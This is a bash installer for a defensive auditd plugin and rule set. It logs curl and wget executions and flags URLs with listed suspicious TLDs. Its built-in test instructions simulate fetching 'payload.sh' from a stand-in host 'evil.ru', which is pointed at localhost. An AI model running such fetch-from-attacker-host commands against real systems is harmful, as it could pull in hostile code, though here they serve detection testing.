#!/usr/bin/env bash
set -euo pipefail

PLUGIN_PATH="/usr/local/sbin/audispd-curl-wget-tld"
PLUGIN_CONF="/etc/audisp/plugins.d/curl_wget_tld.conf"
RULES_DROPIN="/etc/audit/rules.d/curl_wget_downloads.rules"

usage() {
  cat <<'USAGE'
Install/Uninstall audispd plugin that flags curl/wget URLs with suspicious TLDs,
and drop an auditd rules file that logs curl/wget execs and file writes.

USAGE:
  sudo ./install_audisp_curl_wget_tld.sh          # install
  sudo ./install_audisp_curl_wget_tld.sh --uninstall   # uninstall

After install, test quickly:
  echo "127.0.0.1 evil.ru" | sudo tee -a /etc/hosts
  mkdir -p ~/webroot && cd ~/webroot && echo test > payload.sh && python3 -m http.server 8000 &
  curl http://evil.ru:8000/payload.sh -o /tmp/payload.sh
  journalctl -u auditd --since "2 minutes ago" | grep 'AUDIT-ALERT' -i || true
USAGE
}

require_root() {
  if [[ "${EUID}" -ne 0 ]]; then
    echo "[!] Please run as root (sudo)." >&2
    exit 1
  fi
}

restart_auditd() {
  if command -v augenrules >/dev/null 2>&1; then
    augenrules --load || true
  fi
  if command -v systemctl >/dev/null 2>&1; then
    systemctl restart auditd
  else
    service auditd restart
  fi
}

install() {
  require_root

  # Ensure python3 exists
  if ! command -v python3 >/dev/null 2>&1; then
    echo "[!] python3 is required for the plugin. Please install python3 and rerun." >&2
    exit 1
  fi

  # Write plugin script
  mkdir -p "$(dirname "$PLUGIN_PATH")"
  cat > "$PLUGIN_PATH" <<'PYEOF'
#!/usr/bin/env python3
import sys, re, time

# Adjust to your threat model:
TLD_PATTERN = r'\.(ru|cn|su|tk|top|xyz|zip|click|pw)(?:/|:|$)'
tld_re = re.compile(TLD_PATTERN, re.IGNORECASE)

buf = []
def flush_and_check(records):
    raw = "\n".join(records)
    # Only inspect curl/wget executions
    if "type=EXECVE" not in raw and "type=PROCTITLE" not in raw:
        return
    if 'comm="curl"' not in raw and 'comm="wget"' not in raw:
        return

    urls = []
    for line in records:
        if "type=EXECVE" in line or "type=PROCTITLE" in line:
            # Extract tokens that look like hosts/URLs
            for tok in re.findall(r'((?:https?://)?[A-Za-z0-9._-]+\.[A-Za-z]{2,}(?:/[^\s"]*)?)', line):
                urls.append(tok)

    matches = [u for u in urls if tld_re.search(u)]
    if matches:
        ts = time.strftime("%Y-%m-%dT%H:%M:%S%z")
        print(f'{ts} AUDIT-ALERT suspicious TLD via curl/wget: {", ".join(matches)}', flush=True)

for line in sys.stdin:
    line = line.rstrip("\n")
    if not line:
        continue
    buf.append(line)
    if line.startswith("type=EOE") or line.startswith("----"):
        flush_and_check(buf)
        buf = []
PYEOF

  chmod 0755 "$PLUGIN_PATH"

  # Write audisp plugin config
  mkdir -p "$(dirname "$PLUGIN_CONF")"
  cat > "$PLUGIN_CONF" <<CONF
active = yes
direction = in
path = $PLUGIN_PATH
type = always
format = string
CONF

  # Drop auditd rules
  mkdir -p "$(dirname "$RULES_DROPIN")"
  cat > "$RULES_DROPIN" <<'RULES'
## --- curl/wget exec + file write rules ---
-a always,exit -F arch=b64 -S execve -F comm=curl -F auid>=1000 -F auid!=4294967295 -k curl_exec
-a always,exit -F arch=b32 -S execve -F comm=curl -F auid>=1000 -F auid!=4294967295 -k curl_exec
-a always,exit -F arch=b64 -S execve -F comm=wget -F auid>=1000 -F auid!=4294967295 -k wget_exec
-a always,exit -F arch=b32 -S execve -F comm=wget -F auid>=1000 -F auid!=4294967295 -k wget_exec

-a always,exit -F arch=b64 -S open,openat,creat -F comm=curl -F auid>=1000 -F auid!=4294967295 -F exit>=0 -k curl_write
-a always,exit -F arch=b32 -S open,openat,creat -F comm=curl -F auid>=1000 -F auid!=4294967295 -F exit>=0 -k curl_write
-a always,exit -F arch=b64 -S open,openat,creat -F comm=wget -F auid>=1000 -F auid!=4294967295 -F exit>=0 -k wget_write
-a always,exit -F arch=b32 -S open,openat,creat -F comm=wget -F auid>=1000 -F auid!=4294967295 -F exit>=0 -k wget_write
RULES

  # Reload auditd
  restart_auditd

  echo "[+] Installed."
  echo "    - Plugin: $PLUGIN_PATH"
  echo "    - Plugin conf: $PLUGIN_CONF"
  echo "    - Rules: $RULES_DROPIN"
  echo "[*] To test: run:"
  echo "    echo '127.0.0.1 evil.ru' | tee -a /etc/hosts"
  echo "    mkdir -p ~/webroot && cd ~/webroot && echo test > payload.sh && python3 -m http.server 8000 &"
  echo "    curl http://evil.ru:8000/payload.sh -o /tmp/payload.sh"
  echo "    journalctl -u auditd --since '2 minutes ago' | grep 'AUDIT-ALERT' -i || true"
}

uninstall() {
  require_root
  rm -f "$PLUGIN_CONF" || true
  rm -f "$PLUGIN_PATH" || true
  rm -f "$RULES_DROPIN" || true
  restart_auditd
  echo "[+] Uninstalled. Removed plugin, config, and rules."
}

if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
  usage
  exit 0
fi

if [[ "${1:-}" == "--uninstall" ]]; then
  uninstall
  exit 0
fi

install
